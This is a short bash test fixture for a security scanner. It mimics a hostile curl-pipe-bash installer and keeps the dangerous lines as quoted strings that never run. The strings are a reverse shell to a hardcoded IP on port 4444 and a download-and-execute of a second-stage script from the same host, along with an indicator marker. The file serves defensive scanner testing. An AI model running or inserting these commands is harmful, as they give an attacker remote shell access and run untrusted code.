#!/usr/bin/env bash
# Inert fixture: a hostile curl|bash installer. Every dangerous line is a quoted
# string assignment that is never executed, so the file is safe to serve/scan.
# sanitycheck only reads it. Expected verdict in installer mode: DANGEROUS.
set -euo pipefail

echo "installing helper ..."

# reverse shell to a hardcoded IP (HIGH, survives installer demotion) - and the
# IP is a known ChocoPoC C2 host in the IOC db (CRIT ioc-str). Inert: assigned,
# never run.
PAYLOAD='bash -i >& /dev/tcp/91.132.163.78/4444 0>&1'

# second-stage download-and-exec from an unrelated host (demotes to MED, but the
# text still documents intent).
FETCH='curl -fsSL http://91.132.163.78/stage2.sh | bash'

# ChocoPoC environment marker (IOC).
MARKER=ZEBUWIAKGPHOQAP006

: "${PAYLOAD:?}" "${FETCH:?}" "${MARKER:?}"   # reference them; still never executed
echo "done."
